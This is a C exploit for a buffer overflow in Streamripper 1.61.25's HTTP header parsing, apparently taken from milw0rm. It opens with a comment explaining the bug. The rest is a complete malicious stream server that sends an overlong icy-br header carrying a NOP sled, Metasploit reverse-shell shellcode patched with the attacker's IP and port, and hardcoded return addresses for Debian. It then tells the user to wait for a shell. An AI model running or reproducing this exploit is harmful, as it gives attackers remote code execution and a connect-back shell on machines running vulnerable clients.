/*
       _______         ________           .__        _____          __
___  __\   _  \   ____ \_____  \          |  |__    /  |  |   ____ |  | __
\  \/  /  /_\  \ /    \  _(__  <   ______ |  |  \  /   |  |__/ ___\|  |/ /
 >    <\  \_/   \   |  \/       \ /_____/ |   Y  \/    ^   /\  \___|    <
/__/\_ \\_____  /___|  /______  /         |___|  /\____   |  \___  >__|_ \
      \/      \/     \/       \/   29\08\06    \/      |__|      \/     \/
      
 *   mm.           dM8
 *  YMMMb.       dMM8      _____________________________________
 *   YMMMMb     dMMM'     [                                     ]
 *    `YMMMb   dMMMP      [ There are doors I have yet to open  ]
 *      `YMMM  MMM'       [ windows I have yet to look through  ]
 *         "MbdMP         [ Going forward may not be the answer ]
 *     .dMMMMMM.P         [                                     ]
 *    dMM  MMMMMM         [       maybe I should go back        ]
 *    8MMMMMMMMMMI        [_____________________________________]
 *     YMMMMMMMMM                   www.netbunny.org
 *       "MMMMMMP
 *      MxM .mmm
 *      W"W """

[i] Title:              Streamripper HTTP Header Parsing Buffer Overflow Exploit
[i] Discovered by:      Ulf Harnhammar
[i] Exploit by:         Expanders
[i] References:         http://www.securityfocus.com/bid/19707   ---   http://streamripper.sourceforge.net/
[i] Greatings:          x0n3-h4ck - netbunny - my girlfriend..thanks for existing

[ Why streamripper crash? ]

Streamripper like any other shoutcast client send an HTTP GET request to the stream server then receive a pseudo-HTTP response.
Response is made of a ICY [CODE] that show the status of the remote daemon, and a few icy- headers that stores radio informations
like Title - Website - Genre - Bitrate and a special header for song-title offset in the content stream.

in lib/http.c [httplib_parse_sc_header()]

[code segment]
....
char stempbr[50];
....
rc = extract_header_value(header, stempbr, "icy-br:");
....
[/code segment]

extract_header_value(...) calls subnstr_until(const char *str, char *until, char *newstr, int maxlen) that copies from [*str] to [*newstr] trimming
everything next [*until] for a maximum of [maxlen] bytes.

in streamripper-1.61.25 ( maybe prior versions ) MAX_ICY_STRING  costant is passed as [maxlen].

in lib/lib/srtypes.h

#define MAX_ICY_STRING          4024

Putting all together if we send an icy-br: header 156 byte long we reach EIP overwriting.

Code Execution is obvious possible.

[ Timeline ]

Vendor has been informed and version 1.61.26 has been released.

[ Notes ]

Exploit uses shitty hardcoded adresses, there's no registers that point to an usefull location so virtual address exploiting isn't possible.
Probably some better solution can be used but i'm really to lazy and busy to fuck my mind with that.

[ Links ]

www.x0n3-h4ck.org
www.netbunny.org



*/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>

#define BUFFSIZE 200 // Buffer size

int banner();
int usage(char *filename);
int inject(char *port, char *ip);
int remote_connect( char* ip, unsigned short port );


/* linux_ia32_reverse -  Size=70 Encoder=None( hahaha streaming has no restricted 0x00 ) http://metasploit.com */
unsigned char shellcode[] =
                      "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
                      "\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68"
                      "\x00\x00\x00\x00" // IP
                      "\x66\x68"
                      "\x00\x00" // PORT
                      "\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
                      "\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
                      "\x89\xe1\xb0\x0b\xcd\x80";

char http_header[] =  "ICY 200 OK\r\n"
                      "icy-notice1:<BR>This stream requires <a href=\"http://www.winamp.com/\">Winamp</a><BR>\r\n"
                      "icy-notice2:SHOUTcast Distributed Network Audio Server/unix v1.9.7<BR>\r\n"
                      "icy-name:SEGFAULT radio\r\n"
                      "icy-genre:Progressive House\r\n"
                      "icy-url:http://www.x0n3-h4ck.org\r\n"
                      "content-type:audio/mpeg\r\n"
                      "icy-pub:1\r\n"
                      "icy-metaint:1\r\n" // mp3 metatags starts at first byte of content
                      "icy-br:"; // Finally here...

char http_content[] = "\x0d\x0a\x0d\x0a" // \r\n\r\n
                      "\x04" // this magic byte can be used to control malloc(m_buffersize). m_buffersize is (this-byte * 16 ) TODO: egghunter
                      "\x53\x74\x72\x65\x61\x6D\x54\x69\x74\x6C\x65\x3D\x27\x45"
                      "\x78\x70\x61\x6E\x64\x65\x72\x73\x20\x2D\x20\x49\x27\x6C"
                      "\x6C\x20\x4F\x77\x6E\x20\x59\x6F\x75\x27\x3B\x53\x74\x72"
                      "\x65\x61\x6D\x55\x72\x6C\x3D\x27\x27\x3B\x00\x00\x00\x00"
                      "\x00\x00\x00\x00\x00\x00\x00\x00"
                      "\xd3\xff\xff\xf5\xff\xff\xf9\xaf\xff\xe5\x29\xbe\x3e\x8b\x18"; // a few bytes from an mp3


struct retcodes{char *platform;unsigned long addr;} targets[]= {
        { "Debian GNU/Linux testing/unstable"   , 0xb7e70090 },
	{ "Debian GNU/Linux 3.1", 0xb7e71070 },
	{ "Crash daemon - DEBUGGING"   , 0xdeadc0de },
	{ NULL }
};
int banner() {
  printf("\n[i] Title:        \tStreamripper HTTP Header Parsing BOF Exploit\n");
  printf("[i] Discovered by:\tUlf Harnhammar\n");
  printf("[i] Exploit by:   \tExpanders\n\n");
  return 0;
}

int usage(char *filename) {
  int i;
  printf("Usage: \t%s <port> <l_ip> <l_port> <targ>\n\n",filename);
  printf("       \t<port>   : Local port for listener  ::  Default: 8000\n");
  printf("       \t<l_ip>   : Local ip address for connectback\n");
  printf("       \t<l_port> : Local port for connectback\n");
  printf("       \t<targ>   : Target from the list below\n\n");
  
  printf("#   \t Address  \t Target\n");
  printf("---------------------------------------------------------\n");
  for(i = 0; targets[i].platform; i++)
        printf("%d \t 0x%08x \t %s \n",i,targets[i].addr,targets[i].platform);
  printf("---------------------------------------------------------\n");
  exit(0);
}

int inject(char *port, char *ip)
{
    unsigned long m_ip;
    unsigned short m_port;
    m_ip = inet_addr(ip);
    m_port = htons(atoi( port ));
    memcpy ( &shellcode[26], &m_ip, 4);
    memcpy ( &shellcode[32], &m_port, 2);
    return 0;
}

int socket_listen( unsigned short port )
{
  int s,reuseaddr=1;
  struct sockaddr_in localaddr;
  struct hostent* host_addr;

  localaddr.sin_family = AF_INET;
  localaddr.sin_port = htons(port);
  localaddr.sin_addr.s_addr = INADDR_ANY;
  bzero(&(localaddr.sin_zero), 8);

  if ( ( s = socket(AF_INET, SOCK_STREAM, 0) ) < 0 )
  {
   printf ( "[X] socket() failed!\n" );
   exit ( 1 );
  }
  if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &reuseaddr,(socklen_t)sizeof(reuseaddr)) < 0)
  {
   printf("[X] setsockopt() failed!\n");
   exit ( 1 );
  }
  if (bind(s, (struct sockaddr *)&localaddr, sizeof(localaddr)) < 0) 
  {
   perror("[X] bind() failed\n");
   exit ( 1 );
  }
  if (listen(s, 1) < 0)
  {
   perror("[X] listen() failed\n");
   exit ( 1 );
  }
  return ( s );
}

int client_accept( int listener )
{
  int s;
  struct sockaddr_in remoteaddr;
  int addrlen = sizeof(struct sockaddr_in);
  if ((s = accept(listener, (struct sockaddr *)&remoteaddr, &addrlen)) < 0)
  {
   perror("[X] accept() failed\n");
   exit ( 1 );
  }
  if (getpeername(s, (struct sockaddr *)&remoteaddr, &addrlen) < 0)
  {
   perror("[X] getpeername() failed\n");
   exit ( 1 );
  }
  printf("got connection from %s:%u\n", inet_ntoa(remoteaddr.sin_addr), ntohs(remoteaddr.sin_port));
  return ( s );
}


int main(int argc, char *argv[]) {
    int listener,client,position=0;
    unsigned int rcv;
    char buffer[BUFFSIZE],*request;
    char recvbuf[256];
    banner();
    if( (argc != 5) || (atoi(argv[1]) < 1) || (atoi(argv[1]) > 65534) )
        usage(argv[0]);

    printf("[+] Creating evil buffer\n");
    request = (char *) malloc(BUFFSIZE + strlen(http_header) + strlen(http_content)); //  +3 == \r + \n + 0x00
    memset(buffer,0x90,BUFFSIZE);  // Fill with nops

    inject(argv[3],argv[2]);     // Xor port and ip and put them into the shellcode

    position = 156 - strlen(shellcode);   // 156 : EIP offset
    memcpy(buffer+position,shellcode,strlen(shellcode));
    position += strlen(shellcode);
    memcpy(buffer+position,&targets[atoi(argv[4])].addr,4);
    position += 4;
    memset(buffer+position,0x00,1); // End
    sprintf(request,"%s%s%s",http_header,buffer,http_content);

    printf("[+] Setting up socket\n");
    listener = socket_listen(atoi(argv[1]));
    
    printf("[+] Waiting for client...");
    fflush(stdout);
    client = client_accept(listener);
    
    printf("[+] Receiving GET request...");
    fflush(stdout);
    rcv=recv(client,recvbuf,256,0);
    if(rcv<0)
    {
     printf("\n[X] Error while recieving banner!\n");
     close(client);
     close(listener);
     exit( 1 );
    }
    if (strstr(recvbuf,"1.61.25")!=0)
    {
     sleep(1);
     printf("ok\n[+] Sending %d bytes of painfull buffer\n",strlen(request));
     if ( send ( client, request, strlen (request), 0) <= 0 )
     {
            printf("[X] Failed to send buffer\n");
            exit ( 1 );
     }
     printf("[+] Done - Wait for shell on port %s\n",argv[3]);
    } else
      printf("[X] This client is not running Streamripper or it's an unsupported version\n");
    close(client);
    close(listener);
    free(request);
    return 0;
}

// milw0rm.com [2006-08-29]
